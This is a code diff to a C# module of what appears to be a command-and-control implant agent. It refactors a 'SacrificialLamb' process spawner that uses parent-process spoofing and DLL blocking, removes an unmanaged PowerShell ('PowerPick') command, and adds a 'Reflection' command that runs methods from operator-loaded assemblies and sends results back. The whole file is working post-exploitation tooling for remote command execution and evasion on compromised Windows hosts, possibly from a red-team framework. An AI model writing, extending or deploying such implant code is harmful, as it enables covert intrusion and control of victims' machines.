@@ -8,7 +8,6 @@ using Shared.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using System.Reflection;
 using System.Text;
 
@@ -52,11 +51,6 @@ namespace Agent.Modules
                     },
                     new ModuleInfo.Command
                     {
-                        Name = "PowerPick",
-                        Delegate = ExecutePowerPickCommand
-                    },
-                    new ModuleInfo.Command
-                    {
                         Name = "ImportPowerShell",
                         Delegate = ImportPowerShell
                     },
@@ -69,6 +63,11 @@ namespace Agent.Modules
                     {
                         Name = "ImportAssembly",
                         Delegate = ImportAssembly
+                    },
+                    new ModuleInfo.Command
+                    {
+                        Name = "Reflection",
+                        Delegate = ExecuteReflection
                     }
                 }
             };
@@ -83,8 +82,8 @@ namespace Agent.Modules
 
                 var arguments = (string)Task.Parameters["Arguments"];
 
-                var lamb = new SacrificialLamb(ppid, blockdlls);
-                var result = lamb.Shell("klasdjflasdkjflsadjflsadjflskdajflsjdfljdslfjsdlafjlsjdflsjadflsjdlfkj", $"/c {arguments}");
+                var lamb = new SacrificialLamb(Config);
+                var result = lamb.Shell($"/c {arguments}");
 
                 Agent.SendMessage(result);
             }
@@ -109,8 +108,8 @@ namespace Agent.Modules
                     arguments = string.Empty;
                 }
 
-                var lamb = new SacrificialLamb(ppid, blockdlls);
-                var result = lamb.Run(command, "lskdajflaksdjflasjdflkjadslkfjlaksdjfljdsalfjdlsakjfljasdlfj", (string)arguments);
+                var lamb = new SacrificialLamb(Config);
+                var result = lamb.Run(command, (string)arguments);
 
                 Agent.SendMessage(result);
             }
@@ -124,31 +123,11 @@ namespace Agent.Modules
         {
             try
             {
-                var ppid = Config.Get<int>(AgentConfig.PPID);
-                var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
-
-                var arguments = (string)Task.Parameters["Arguments"];
-
-                var lamb = new SacrificialLamb(ppid, blockdlls);
-                var result = lamb.PowerShell("klasdjflasdkjflsadjflsadjflskdajflsjdfljdslfjsdlafjlsjdflsjadflsjdlfkj", $"-c \"{arguments}\"");
-
-                Agent.SendMessage(result);
-            }
-            catch (Exception e)
-            {
-                Agent.SendError(e.Message);
-            }
-        }
-
-        void ExecutePowerPickCommand(string AgentID, AgentTask Task)
-        {
-            try
-            {
                 var arguments = (string)Task.Parameters["Arguments"];
 
                 using (var runner = new PowerShellRunner())
                 {
-                    if (CurrentPowerShell.Length > 0)
+                    if (CurrentPowerShell != null && CurrentPowerShell.Length > 0)
                     {
                         runner.ImportScript(Encoding.UTF8.GetString(CurrentPowerShell));
                     }
@@ -227,6 +206,56 @@ namespace Agent.Modules
                 Agent.SendError(e.Message);
             }
             
+        }
+
+        void ExecuteReflection(string AgentID, AgentTask Task)
+        {
+            try
+            {
+                if (CurrentAssembly == null)
+                {
+                    Agent.SendError("Must import an assembly first");
+                    return;
+                }
+
+                var type = (string)Task.Parameters["Type"];
+                var method = (string)Task.Parameters["Method"];
+                var args = Task.Parameters["Arguments"];
+
+                var t = CurrentAssembly.GetType(type);
+
+                if (t == null)
+                {
+                    Agent.SendError($"Could not find type {type} in assembly");
+                    return;
+                }
+
+                var m = t.GetMethod(method);
+
+                if (m == null)
+                {
+                    Agent.SendError($"Could not find method {method} in assembly");
+                    return;
+                }
+
+                string result;
+
+                if (args == null)
+                {
+                    result = (string)m.Invoke(null, new object[] { });
+                }
+                else
+                {
+                    result = (string)m.Invoke(null, new object[] { args });
+                }
+
+                Agent.SendMessage(result);
+
+            }
+            catch (Exception e)
+            {
+                Agent.SendError(e.Message);
+            }
         }
 
         void ImportPowerShell(string AgentID, AgentTask Task)
